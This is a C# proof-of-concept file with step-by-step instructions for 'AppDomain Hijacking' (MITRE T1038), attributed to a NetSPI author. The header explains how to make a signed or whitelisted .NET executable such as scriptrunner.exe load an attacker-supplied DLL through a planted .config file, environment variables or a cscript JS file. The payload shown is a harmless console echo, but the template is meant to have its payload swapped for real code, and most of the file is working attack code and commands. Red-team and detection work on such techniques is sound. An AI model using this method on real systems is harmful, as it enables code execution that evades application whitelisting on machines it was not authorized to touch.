/*

 AppDomain Hijacking Execution Method
 Payload: Hello World
 Description: This script will echo back anything written to the console.
 Mitre ATT&CK ID: T1038
 Author: Scott Sutherland, NetSPI 
 Credits: Based on techniques by Casey Smith.
 
 Execution Option: Config File
 
 1. Update code as need and compile this DLL.

    C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /target:library /out:AppDomain-Hijack-HelloWorld.dll AppDomain-Hijack-HelloWorld.cs
	
 2. Locate .net executable that is white listed or signed by a trusted publisher using Get-PE function from Matt Graeber's PowerShell Arsenal Project.  
    Example: c:\windows\system32\scriptrunner.exe.
 
    gci c:\windows\system32\*.exe | get-pe | where-object {$_.Imports.ModuleName -Contains "mscoree.dll"} | Select ModuleName -ExpandProperty modulename
 
 3. Copy the .net executable to a writable directory. 
	Example: C:\Windows\Temp
 
    Copy c:\windows\system32\scriptrunner.exe C:\Windows\Temp\scriptrunner.exe
 
 4. Create a configuration file in the same folder with the content below.  Name it after the target assembly, but append .config to the file name.  
	Example: scriptrunner.exe.config
 
	<configuration>
	<runtime>
	<assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
	<probing privatePath="C:\Windows\Temp"/> </assemblyBinding>
	<appDomainManagerAssembly value="AppDomain-Hijack-HelloWorld, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null" />
	<appDomainManagerType value="Hijack" />
	</runtime>
	</configuration>
	
 5. Run .net executable.  Example: scriptrunner.exe
 
 	scriptrunner.exe
 
 Execution Option: Environmental Variables
 Alternatively, set the following environmental variable and run the .net executable.  
 Note: The configuration file will take president over the environmental variables, and setting environmental variables in the code will take president over config files.
 
    set APPDOMAIN_MANAGER_ASM=AppDomain-Hijack-HelloWorld, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
	set APPDOMAIN_MANAGER_TYPE=Hijack
	set COMPLUS_Version=v4.0.30319
	
	scriptrunner.exe

 Execution Option: cscript 
 Alternatively, create a JS file with the following content and execute with cscript.
 
	new ActiveXObject('WScript.Shell').Environment('Process')('COMPLUS_Version') = 'v4.0.30319';new ActiveXObject('WScript.Shell').Environment('Process')('TMP') = 'c:\Window\Temp';
	new ActiveXObject('WScript.Shell').Environment('Process')('APPDOMAIN_MANAGER_ASM') = 'AppDomain-Hijack-HelloWorld, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null';
	new ActiveXObject('WScript.Shell').Environment('Process')('APPDOMAIN_MANAGER_TYPE') = 'Hijack';
	var o = new ActiveXObject("System.Object"); 
	
	cscript AppDomain-Hijack-HelloWorld.js

*/
using System;
using System.IO;
using System.IO.Compression;

public sealed class Hijack : AppDomainManager
{
	public override void InitializeNewDomain(AppDomainSetup appDomainInfo)
	{					
		BreakOut.RunCommand();	
		return;
	}
	
	public class BreakOut
    {
		public static string RunCommand()
        {
			Console.Write("AppDomainHijacked> ");
			String cmd = Console.ReadLine();
			Console.WriteLine(cmd.ToString());				

			Console.ReadLine();
					
			RunCommand();
			return "nothing";
        }
    }	
}
